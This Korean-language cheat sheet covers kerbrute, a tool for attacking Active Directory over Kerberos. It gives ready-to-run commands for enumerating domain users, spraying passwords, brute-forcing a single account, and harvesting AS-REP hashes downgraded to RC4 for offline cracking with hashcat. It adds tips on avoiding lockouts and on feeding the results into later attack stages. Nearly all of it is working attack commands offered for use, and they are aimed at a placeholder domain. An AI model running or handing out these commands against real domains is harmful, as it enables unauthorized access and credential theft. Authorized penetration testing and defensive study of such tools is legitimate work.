# kerbrute로 사용자·패스워드 열거

- kerbrute — Kerberos pre-auth를 이용해 도메인 사용자명과 패스워드를 빠르게 검증하는 Go 도구. 응답의 성공·실패 차이로 유효 계정을 식별한다.
- AS-REP/패스워드 스프레이 앞단에서 사용자 목록을 검증(userenum)할 때, 확보한 계정 목록에 단일 패스워드를 뿌려(passwordspray) 로그인 가능 계정을 찾을 때.
- Kali는 apt install kerbrute, Windows에선 GitHub release의 kerbrute_windows_amd64.exe를 내려받는다. -d(도메인) 또는 --dc 지정 필요.

## 설치

```bash
sudo apt install kerbrute
# Windows: https://github.com/ropnop/kerbrute/releases -> kerbrute_windows_amd64.exe
kerbrute_windows_amd64.exe userenum -d corp.local --dc 10.10.10.10 users.txt
```

## 세 가지 모드

```bash
# 사용자명 열거 (계정 잠금 유발 없음, 이벤트 4768만 생성)
kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt

# 단일 패스워드를 사용자 목록에 스프레이 (이벤트 4768+4771, 잠금 위험)
kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Password123!'

# 단일 사용자를 패스워드 워드리스트로 시도
kerbrute bruteuser -d corp.local --dc 10.10.10.10 passwords.lst administrator
```

- 워드리스트는 플래그가 아니라 위치 인자로 들어간다. passwordspray는 사용자 목록 뒤에 패스워드를, bruteuser는 패스워드 목록 뒤에 사용자명을 붙인다.
- userenum은 pre-auth 실패가 계정 잠금을 유발하지 않으므로 자유롭게 쓰고, passwordspray·bruteuser는 잠금 정책을 확인한 뒤 --safe를 함께 쓴다.

## 주요 옵션

```bash
kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt -o found.txt -t 30 --safe
```

- `-d`: 대상 도메인(FQDN). --dc와 함께 쓰는 것이 기본형이다.
- `--dc`: 도메인 컨트롤러(KDC) 주소. 생략하면 DNS로 찾는다.
- `-o`: 결과를 파일로 저장한다.
- `-t`: 스레드 수(기본 10). `--delay`를 주면 단일 스레드로 전환되어 천천히 시도한다.
- `--safe`: 계정이 잠금 상태로 응답하면 즉시 중단한다.

## AS-REP 해시 수집과 연계

```bash
kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt --hash-file asrep.txt --downgrade
```

- `--hash-file`: pre-auth 비활성 계정(AS-REP roasting 대상)의 해시를 파일로 저장해 hashcat 모드 18200에 넘긴다.
- `--downgrade`: arcfour-hmac-md5(NTLM급) 암호로 강등해 hashcat 친화적 포맷을 만든다.

## 팁·트러블슈팅

1. 도메인에 잠금 정책이 있으면 passwordspray는 시도당 1~2개 패스워드로 제한하고, 잠금 이벤트 흔적이 보이면 즉시 중단한다.
2. SMB 기반 열거(rpcclient, enum4linux-ng)가 막혀도 Kerberos(88)가 열려 있으면 userenum은 동작하므로 좋은 대안이 된다.
3. 결과에서 유효 계정만 뽑으려면 -o로 저장한 로그를 grep으로 걸러 다음 단계(passwordspray, AS-REP roast) 입력으로 쓴다.
